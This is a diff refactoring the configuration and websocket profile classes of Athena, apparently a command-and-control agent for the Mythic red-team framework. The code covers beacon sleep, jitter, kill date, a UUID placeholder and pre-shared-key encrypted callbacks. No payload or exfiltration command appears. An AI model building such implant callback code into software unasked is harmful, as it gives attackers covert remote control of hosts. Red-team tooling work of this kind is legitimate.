@@ -1,3 +1,5 @@
+﻿using Athena.Models;
+using Athena.Models.Config;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
@@ -9,16 +11,16 @@ using System.Threading.Tasks;
 
 namespace Athena
 {
-    public class MythicConfig
+    public class Config : IConfig
     {
-        public Websocket currentConfig { get; set; }
+        public IProfile currentConfig { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder;
+        //public Forwarder forwarder;
 
-        public MythicConfig()
+        public Config()
         {
             uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
@@ -28,11 +30,11 @@ namespace Athena
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket();
-            this.forwarder = new Forwarder();
+            //this.forwarder = new Forwarder();
         }
     }
 
-    public class Websocket
+    public class Websocket : IProfile
     {
         public string psk { get; set; }
         public string endpoint { get; set; }
@@ -56,7 +58,7 @@ namespace Athena
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
+                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -106,7 +108,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Config.uuid + json);
                 }
 
                 WebSocketMessage m = new WebSocketMessage()
@@ -180,6 +182,34 @@ namespace Athena
                 return String.Empty;
             }
         }
+        ///// <summary>
+        ///// Base64 encode a string and return the encoded string
+        ///// </summary>
+        ///// <param name="plainText">String to encode</param>
+        //public static async Task<string> Base64Encode(string plainText)
+        //{
+        //    var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
+        //    return Convert.ToBase64String(plainTextBytes);
+        //}
+
+        ///// <summary>
+        ///// Base64 encode a byte array and return the encoded string
+        ///// </summary>
+        ///// <param name="bytes">Byte array to encode</param>
+        //public static async Task<string> Base64Encode(byte[] bytes)
+        //{
+        //    return Convert.ToBase64String(bytes);
+        //}
+
+        ///// <summary>
+        ///// Base64 decode a string and return the decoded string
+        ///// </summary>
+        ///// <param name="base64EncodedData">String to decode</param>
+        //public static async Task<string> Base64Decode(string base64EncodedData)
+        //{
+        //    var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
+        //    return Encoding.UTF8.GetString(base64EncodedBytes);
+        //}
         private class WebSocketMessage
         {
             public bool Client { get; set; }
